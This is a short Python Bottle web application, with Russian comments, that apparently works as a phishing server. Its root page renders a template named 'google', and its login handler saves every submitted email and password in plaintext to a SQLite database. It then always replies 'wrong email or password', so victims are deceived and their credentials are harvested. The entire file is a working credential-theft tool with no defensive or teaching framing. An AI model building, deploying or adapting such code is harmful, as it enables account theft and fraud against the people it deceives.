from bottle import Bottle, run, template, request, static_file, response
import sqlite3
import os

app = Bottle()

# Путь к базе данных
DATABASE = 'users.db'

# Функция для создания базы данных
def create_database():
    if not os.path.exists(DATABASE):
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                email TEXT NOT NULL,
                password TEXT NOT NULL
            )
        ''')
        conn.commit()
        conn.close()

# Проверка дубликатов
def is_duplicate(email, password):
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users WHERE email = ? AND password = ?', (email, password))
    result = cursor.fetchone()
    conn.close()
    return result is not None

# Главная страница
@app.route('/')
def index():
    return template('google')

# Обработка входа
@app.route('/login', method='POST')
def login():
    email = request.forms.get('email')
    password = request.forms.get('password')

    if not is_duplicate(email, password):
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute('INSERT INTO users (email, password) VALUES (?, ?)', (email, password))
        conn.commit()
        conn.close()

    response.content_type = 'application/json'
    return {'error': 'Неверная почта или пароль'}

# Статические файлы
@app.route('/static/<filename:path>')
def serve_static(filename):
    return static_file(filename, root='./static')

# Запуск сервера
if __name__ == '__main__':
    create_database()
    run(app, host='0.0.0.0', port=8080, debug=True)